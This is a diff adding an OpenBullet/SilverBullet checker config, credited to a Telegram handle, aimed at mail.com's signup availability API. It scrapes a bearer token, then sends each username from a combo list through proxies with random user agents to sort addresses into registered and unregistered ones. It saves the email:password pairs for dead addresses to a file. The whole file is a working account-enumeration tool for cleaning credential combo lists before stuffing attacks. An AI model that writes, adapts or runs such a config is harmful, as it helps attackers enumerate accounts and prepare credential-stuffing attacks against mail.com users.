@@ -1,0 +1,121 @@
+[SETTINGS]
+{
+  "Name": "mail.com die ༺❨𝓕𝓻𝓮𝓭𝓮𝓻𝓲𝓬𝓴 𝓢𝓶𝓯❩༻",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2023-07-28T20:29:44.8104398+07:00",
+  "AdditionalInfo": "mail.com die",
+  "RequiredPlugins": [],
+  "Author": "t.me/userbtd",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "mail",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+# FUNCTION GetRandomUA -> VAR "ua" 
+
+# REQUEST GET "https://signup.mail.com/" 
+  
+  HEADER "Host: signup.mail.com" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: <ua>" 
+
+# PARSE "<SOURCE>" LR "\"accessToken\": \"" "\"" -> VAR "accessToken" 
+
+# PARSE "<SOURCE>" LR "\"clientCredentialGuid\": \"" "\"" -> VAR "X-CCGUID" 
+
+# FUNCTION GenerateGUID -> VAR "X-REQUEST-ID" 
+
+# REQUEST POST "https://signup.mail.com/suggest/rest/email-alias/availability" 
+  CONTENT "{\"emailAddress\":\"<USER>\",\"firstName\":\"\",\"lastName\":\"\",\"birthDate\":\"\",\"city\":\"\",\"countryCode\":\"US\",\"suggestionProducts\":[\"mailcomFree\"],\"maxResultCountPerProduct\":\"10\",\"mdhMaxResultCount\":\"5\",\"initialRequestedEmailAddress\":\"\",\"requestedEmailAddressProduct\":\"mailcomFree\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Authorization: Bearer <accessToken>" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 281" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Host: signup.mail.com" 
+  HEADER "Origin: https://signup.mail.com" 
+  HEADER "Referer: https://signup.mail.com/" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: <ua>" 
+  HEADER "X-CCGUID: <X-CCGUID>" 
+  HEADER "X-REQUEST-ID: <X-REQUEST-ID>" 
+  HEADER "X-UI-APP: @umreg/registration-app2/7.2.5" 
+
+# KEYCHECK 
+  KEYCHAIN Custom "Live" OR 
+    KEY "emailAddressAvailable\":false" 
+  KEYCHAIN Success OR 
+    KEY "emailAddressAvailable\":true" 
+  KEYCHAIN Retry OR 
+    KEY "urn:problem:mam.1suggestion:unauthorized-access" 
+  KEYCHAIN Failure OR 
+    KEY "is not a valid pattern" 
+    KEY "Validation problem" 
+
+SET CAP "Die" "<USER>:<PASS>"
+
+# UTILITY File "MAIL.COM_DIE.txt" AppendLines "<USER>:<PASS>" -> VAR "Savehits" 
+
